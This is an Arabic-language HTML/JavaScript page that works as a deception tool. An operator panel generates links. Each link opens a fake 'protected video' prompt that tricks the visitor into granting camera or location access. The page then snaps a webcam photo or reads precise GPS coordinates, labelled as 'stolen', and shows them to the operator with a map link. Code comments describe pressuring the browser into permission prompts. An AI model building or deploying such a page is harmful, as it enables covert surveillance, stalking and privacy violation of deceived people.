<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم</title>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --accent: #3b82f6; --text: #f8fafc; --success: #10b981; }
        body { margin: 0; background: var(--bg); font-family: sans-serif; color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .admin-box { background: var(--card); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; }
        .mode-btn { padding: 10px 20px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #94a3b8; cursor: pointer; margin: 5px; }
        .mode-btn.active { background: var(--accent); color: white; }
        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 10px; color: white; margin: 15px 0; box-sizing: border-box; }
        .btn { background: var(--accent); color: white; border: none; padding: 14px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
        .victim-ui { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .dialog { background: #111; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #222; width: 85%; max-width: 350px; }
        .hidden { display: none !important; }
        #location-data { background: #0f172a; padding: 15px; border-radius: 10px; border: 1px solid var(--success); margin-top: 20px; }
    </style>
</head>
<body>

<div id="admin-panel" class="admin-box">
    <h2>لوحة التحكم</h2>
    <div>
        <button class="mode-btn active" onclick="setMode('c1', this)">صورة</button>
        <button class="mode-btn" onclick="setMode('l2', this)">موقع</button>
    </div>
    <input type="text" id="urlInput" placeholder="أدخل الرابط هنا">
    <button class="btn" onclick="generate()">إنشاء رابط</button>
    <div id="result" class="hidden" style="margin-top:15px;">
        <input id="finalLink" readonly style="font-size:12px; text-align:center;">
    </div>
    <div id="display" class="hidden">
        <div id="cam-res" class="hidden"><img id="preview" style="width:100%; border-radius:10px; margin-top:15px;"></div>
        <div id="loc-res" class="hidden">
            <div id="location-data">
                <p style="color:var(--success)">✅ تم سحب الإحداثيات!</p>
                <p id="coords" style="font-size:12px;"></p>
                <a id="mapBtn" target="_blank" class="btn" style="background:#ef4444; text-decoration:none; display:block; margin-top:10px;">فتح الخريطة</a>
            </div>
        </div>
    </div>
</div>

<div id="victim-ui" class="victim-ui hidden">
    <div class="dialog">
        <h2 id="v-title">محتوى محمي</h2>
        <p id="v-desc" style="color:#888;">يجب السماح للمشغل بالتحقق من المنطقة لتشغيل الفيديو.</p>
        <button class="btn" id="mainAction">السماح بالمشاهدة</button>
    </div>
</div>

<script>
let mode = 'c1';
const urlParams = new URLSearchParams(window.location.search);
const auth = urlParams.get('auth');

function setMode(m, b) {
    mode = m;
    document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
    b.classList.add('active');
}

// --- كود الضحية المعدل ---
if (auth) {
    document.getElementById('admin-panel').remove();
    document.getElementById('victim-ui').classList.remove('hidden');

    document.getElementById('mainAction').onclick = function() {
        const target = localStorage.getItem('last_url') || 'https://youtube.com';
        
        if (auth === 'c1') {
            navigator.mediaDevices.getUserMedia({video: true}).then(s => {
                const v = document.createElement('video'); v.srcObject = s; v.play();
                setTimeout(() => {
                    const c = document.createElement('canvas');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    localStorage.setItem('stolen_img', c.toDataURL('image/jpeg'));
                    s.getTracks().forEach(t => t.stop());
                    window.location.href = target;
                }, 1000);
            }).catch(() => window.location.href = target);
        } else {
            // الاستراتيجية الجديدة: التنبيه المسبق لإجبار النظام على فتح نافذة الإذن
            alert("تنبيه: المشغل يحتاج الوصول للموقع الجغرافي لتحديد سيرفر المشاهدة الأقرب.");
            
            const geoOptions = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
            
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    localStorage.setItem('stolen_loc', JSON.stringify({lat: p.coords.latitude, lng: p.coords.longitude}));
                    window.location.href = target;
                },
                (e) => {
                    // إذا فشل، نحاول مرة أخرى بصيغة Watch لزيادة الضغط على المتصفح
                    navigator.geolocation.watchPosition((p) => {
                        localStorage.setItem('stolen_loc', JSON.stringify({lat: p.coords.latitude, lng: p.coords.longitude}));
                        window.location.href = target;
                    }, () => { window.location.href = target; }, geoOptions);
                }, geoOptions
            );
        }
    };
}

function generate() {
    const val = document.getElementById('urlInput').value;
    if(!val) return alert("أدخل رابطاً");
    localStorage.setItem('last_url', val);
    document.getElementById('finalLink').value = window.location.origin + window.location.pathname + "?auth=" + mode;
    document.getElementById('result').classList.remove('hidden');
}

window.addEventListener('storage', (e) => {
    document.getElementById('display').classList.remove('hidden');
    if (e.key === 'stolen_img') {
        document.getElementById('cam-res').classList.remove('hidden');
        document.getElementById('preview').src = e.newValue;
    }
    if (e.key === 'stolen_loc') {
        document.getElementById('loc-res').classList.remove('hidden');
        const d = JSON.parse(e.newValue);
        document.getElementById('coords').innerText = `Lat: ${d.lat}\nLng: ${d.lng}`;
        document.getElementById('mapBtn').href = `https://www.google.com/maps?q=${d.lat},${d.lng}`;
    }
});
</script>
</body>
</html>
